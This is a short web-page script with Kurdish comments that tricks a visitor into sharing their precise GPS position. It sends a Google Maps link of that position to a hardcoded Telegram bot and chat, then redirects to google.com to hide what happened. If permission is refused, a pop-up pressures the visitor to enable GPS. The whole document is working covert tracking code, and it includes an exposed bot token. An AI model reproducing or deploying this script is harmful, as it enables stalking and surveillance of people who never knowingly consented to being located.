<script>
    const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
    const ID = '6351568884';

    function sendLocation() {
        if (navigator.geolocation) {
            // Options بۆ وردترکردنی لۆکەیشنەکە
            const options = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                // دروستکردنی لینکی ڕاستەوخۆ بۆ Google Maps
                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                const message = `📍 **Location Found!**\n\nLink: ${googleMapsLink}`;

                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
                .then(() => {
                    window.location.href = "https://www.google.com";
                });

            }, (error) => {
                // ئەگەر کەسەکە ڕەتی بکاتەوە یان GPS کوژاوە بێت
                alert("Please enable your GPS and allow access to continue.");
            }, options);
        } else {
            alert("Your browser does not support Geolocation.");
        }
    }
</script>
